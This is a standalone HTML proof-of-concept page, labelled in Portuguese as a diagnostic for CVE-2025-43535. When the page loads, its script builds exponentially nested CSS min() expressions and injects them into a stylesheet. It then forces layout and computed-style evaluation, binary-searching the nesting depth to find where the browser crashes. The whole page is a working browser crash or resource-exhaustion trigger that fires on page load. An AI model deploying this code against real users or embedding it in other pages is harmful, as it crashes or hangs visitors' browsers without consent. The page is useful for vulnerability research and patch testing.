<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 — V1 Diagnostic</title>
<style>
body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
#log { background:#111; border:1px solid #2a4a2a; padding:12px;
       height:65vh; overflow-y:auto; font-size:12px; line-height:1.6; }
.ok{color:#00ff88}
.fail{color:#ff4444}
.info{color:#ffcc44}
.phase{color:#44aaff}
.crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>

<h3>CVE-2025-43535 — Variante 1 Diagnóstico Completo</h3>
<div id="log"></div>

<script>
"use strict";

const logEl = document.getElementById("log");

function L(msg, cls){
  const d=document.createElement("div");
  d.className=cls||"info";
  d.textContent="["+(Date.now()%100000)+"] "+msg;
  logEl.appendChild(d);
  logEl.scrollTop=logEl.scrollHeight;
}

function buildExponential(depth){
  let e = "1px";
  for(let i=0;i<depth;i++){
    e = "min(" + e + "," + e + ")";
  }
  return e;
}

async function testDepth(depth){

  L("══════════════════════════════════","info");
  L("TESTANDO depth = " + depth,"info");

  let expr;
  let sizeMB = 0;

  // PHASE 1 — Construção JS
  try{
    L("PHASE 1 — Construindo string...","phase");
    expr = buildExponential(depth);
    sizeMB = (expr.length / 1024 / 1024).toFixed(2);
    L("Construção OK — tamanho ≈ " + sizeMB + " MB","ok");
  }catch(e){
    L("ERRO na construção: " + e,"fail");
    return false;
  }

  await new Promise(r=>setTimeout(r,200));

  const el=document.createElement("div");
  el.style.cssText="position:absolute;top:-9999px";
  document.body.appendChild(el);

  const sheet=document.createElement("style");
  document.head.appendChild(sheet);

  // PHASE 2 — Inserção no stylesheet
  try{
    L("PHASE 2 — Inserindo no <style>...","phase");
    sheet.textContent=".t{width:"+expr+";height:"+expr+"}";
    L("Inserção OK","ok");
  }catch(e){
    L("ERRO ao inserir stylesheet: " + e,"fail");
    cleanup(el,sheet);
    return false;
  }

  await new Promise(r=>setTimeout(r,200));

  // PHASE 3 — Forçar layout
  try{
    L("PHASE 3 — Forçando layout (offsetWidth)...","phase");
    el.className="t";
    void el.offsetWidth;
    L("Layout OK","ok");
  }catch(e){
    L("ERRO durante layout: " + e,"fail");
    cleanup(el,sheet);
    return false;
  }

  await new Promise(r=>setTimeout(r,200));

  // PHASE 4 — getComputedStyle
  try{
    L("PHASE 4 — getComputedStyle...","phase");
    const cs = getComputedStyle(el).width;
    L("ComputedStyle OK: " + cs,"ok");
  }catch(e){
    L("ERRO em getComputedStyle: " + e,"fail");
    cleanup(el,sheet);
    return false;
  }

  cleanup(el,sheet);

  L("Depth "+depth+" COMPLETO sem crash","ok");
  return true;
}

function cleanup(el,sheet){
  try{ document.head.removeChild(sheet); }catch(e){}
  try{ document.body.removeChild(el); }catch(e){}
}

async function binarySearchLimit(){

  let low = 20;
  let high = 30;
  let lastGood = 0;

  while(low <= high){

    const mid = Math.floor((low + high)/2);

    L("Binary search test depth = "+mid,"info");

    let ok = await testDepth(mid);

    if(ok){
      lastGood = mid;
      low = mid + 1;
    }else{
      high = mid - 1;
    }

    await new Promise(r=>setTimeout(r,500));
  }

  L("══════════════════════════════════","info");
  L("MAIOR DEPTH ESTÁVEL = " + lastGood,"crash");
  L("══════════════════════════════════","info");
}

window.addEventListener("load",()=>{
  setTimeout(binarySearchLimit,500);
});
</script>

</body>
</html>
